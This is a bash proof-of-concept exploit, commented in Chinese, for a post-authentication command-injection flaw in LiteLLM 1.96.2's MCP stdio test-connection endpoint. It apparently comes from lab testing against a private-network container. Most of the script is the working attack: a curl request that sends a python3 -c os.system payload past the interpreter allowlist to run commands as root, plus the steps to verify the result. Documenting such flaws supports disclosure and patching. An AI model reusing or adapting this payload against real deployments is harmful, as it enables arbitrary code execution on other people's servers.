#!/bin/bash
# LiteLLM MCP stdio test endpoint — 命令注入 (CWE-78) PoC
# 目标: ubuntu-24.04.3-02 (192.168.188.x), LiteLLM 1.96.2 (容器 tmp_ll_litellm_1)
# 认证: 通过 KEY 环境变量提供 proxy API key (post-auth)
# 复现方式分层: 真实网络攻击路径 (攻击机 HTTP 直接触发)
# 效果: 以 root (LiteLLM 容器内) 执行任意命令

TARGET="${TARGET:-http://192.168.188.x:8000}"
: "${KEY:?请先通过 KEY 环境变量提供 LiteLLM proxy API key}"

# 说明: /mcp-rest/test/connection 的 stdio transport 会把 command+args 作为子进程拉起。
# 1.96.2 已加白名单 [deno,docker,node,npx,python,python3,uvx]，但 python3/node 等解释器
#     本身即可执行任意代码 -> 白名单可绕过。

echo "[*] 触发命令注入: id > /tmp/PWNED_$(date +%s).txt (容器内 root 执行)"
curl -s -X POST "$TARGET/mcp-rest/test/connection" \
  -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  -d '{"transport":"stdio","command":"python3","args":["-c","import os;os.system(\"id > /tmp/PWNED.txt 2>&1; hostname >> /tmp/PWNED.txt\")"]}'
echo

# 验证 (需能 docker exec 到目标容器):
#   sudo docker exec tmp_ll_litellm_1 cat /tmp/PWNED.txt
# 期望输出:
#   uid=0(root) gid=0(root) groups=0(root),...
#   f7a355ad9b87   (容器ID)
echo "[*] 验证: sudo docker exec tmp_ll_litellm_1 cat /tmp/PWNED.txt"
